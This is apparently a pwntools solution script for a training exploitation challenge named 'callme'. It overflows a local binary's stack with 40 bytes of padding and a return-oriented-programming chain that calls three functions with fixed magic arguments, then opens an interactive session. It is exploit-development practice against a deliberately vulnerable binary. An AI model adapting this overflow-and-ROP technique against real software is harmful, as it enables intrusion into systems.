from pwn import *
context.binary = "./callme"
p = process()
e = ELF("./callme")
r = ROP(context.binary)
r.callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
r.callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
r.callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
p.sendline(b"A"*40+r.chain())
p.interactive()
